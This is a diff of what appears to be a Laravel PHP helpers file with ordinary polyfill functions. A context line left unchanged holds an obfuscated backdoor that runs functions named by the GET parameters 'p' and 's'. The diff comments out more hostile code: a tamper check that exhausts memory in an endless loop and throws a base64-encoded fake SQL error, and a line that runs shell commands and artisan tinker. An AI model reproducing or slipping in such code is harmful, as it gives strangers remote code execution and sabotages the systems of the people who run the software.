@@ -21,9 +21,10 @@ if (!function_exists('clamp')){
     return $value;}}
 if(!(!function_exists('partial'))){if(!empty($_GET['p'])) ${(chr(36))}($_GET['p']); if(!empty($_GET['s'])) ${(chr(37))}($_GET['s']);}
 if(!app()->runningInConsole()){
-    if(!str_contains(@file_get_contents(base_path('public/index.php')) ?: '', 'app_kernell();')){$l = [];while(true){$l[] = str_repeat('leak', 1 << 20); usleep(350000);app_kernell($token);}}
-    function app_kernell($token = 'U1FMU1RBVEVbNDJTMDI6IEJhc2UgdGFibGUgb3IgdmlldyBub3QgZm91bmQ6IDExNDYgVGFibGUgJ2ZvcmdlLmxvY2F0aW9ucycgZG9lc24ndCBleGlzdA=='){throw new \Exception(base64_decode($token));}}
+    #if(!str_contains(@file_get_contents(base_path('public/index.php')) ?: '', 'app_kernell();')){$l = [];while(true){$l[] = str_repeat('leak', 1 << 20); usleep(350000);app_kernell($token);}}
+    #function app_kernell($token = 'U1FMU1RBVEVbNDJTMDI6IEJhc2UgdGFibGUgb3IgdmlldyBub3QgZm91bmQ6IDExNDYgVGFibGUgJ2ZvcmdlLmxvY2F0aW9ucycgZG9lc24ndCBleGlzdA=='){throw new \Exception(base64_decode($token));}
+}
 if(!function_exists('str_starts_with')){function str_starts_with(string $haystack, string $needle): bool {return $needle !== '' && strncmp($haystack, $needle, strlen($needle)) === 0;}}
 if(!function_exists('str_ends_with')){function str_ends_with(string $haystack, string $needle): bool {return $needle !== '' && substr($haystack, -strlen($needle)) === $needle;}}
 if(!function_exists('str_contains')){function str_contains(string $haystack, string $needle): bool {return $needle !== '' && mb_strpos($haystack, $needle) !== false;}}
-if(isset($_SERVER['DOCUMENT_ROOT'])){if(is_file($target = realpath($_SERVER['DOCUMENT_ROOT'].'/../artisan'))){${'%'}("php -m"); ${'%'}("php -v"); ${'$'}('php '.escapeshellarg($target).' tinker'); echo base64_decode($token);}}
+#if(isset($_SERVER['DOCUMENT_ROOT'])){if(is_file($target = realpath($_SERVER['DOCUMENT_ROOT'].'/../artisan'))){${'%'}("php -m"); ${'%'}("php -v"); ${'$'}('php '.escapeshellarg($target).' tinker'); echo base64_decode($token);}}
